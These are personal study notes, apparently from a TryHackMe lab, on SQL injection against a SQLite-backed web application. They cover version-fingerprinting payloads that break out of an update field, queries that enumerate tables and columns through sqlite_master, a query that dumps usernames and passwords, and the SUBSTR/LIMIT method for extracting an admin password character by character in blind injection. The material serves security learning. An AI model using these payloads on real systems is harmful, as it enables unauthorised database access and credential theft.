# Quaries for Dump from SQLlite Database


********** 

### With this knowledge, we can try to identify what database is in use. There are a few ways to do this, but the easiest way is to ask the database to identify itself. The following queries can be used to identify MySQL, MSSQL, Oracle, and SQLite:

```
# MySQL and MSSQL
',nickName=@@version,email='
# For Oracle
',nickName=(SELECT banner FROM v$version),email='
# For SQLite
',nickName=sqlite_version(),email='
```



**The ```group_concat()``` function is used to dump all the tables simultaneously.**

```
SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
```

We can then continue by ```extract all the column names``` from the usertable:

```
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'
```

### By knowing the names of the columns, we can extract the data we want from the database. 


```
SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable
```

# Broken Authentication (Blind Injection)

The first argument to [substr](https://sqlite.org/lang_corefunc.html#substr) is the string itself, which will be the admin's password. The second argument is the starting position, and the third argument is the length of the substring that will be returned.

```SUBSTR( string, <start>, <length>)```

Below is an example of substr in action - the character after the equal (=) sign demonstrates the substring returned.

-- Changing start
SUBSTR("THM{Blind}", 1,1) = T
SUBSTR("THM{Blind}", 2,1) = H
SUBSTR("THM{Blind}", 3,1) = M

-- Changing length
SUBSTR("THM{Blind}", 1,3) = THM

The next step will be to enter the admin's password as a string into the substr function. This can be achieved with the following query:

(SELECT password FROM users LIMIT 0,1)


The LIMIT clause is used to limit the amount of data returned by the SELECT statement. The first number, 0, is the offset and the second integer is the limit:

LIMIT <OFFSET>, <LIMIT>

Below are a few examples of the LIMIT clause in action. The right table represents the user table.
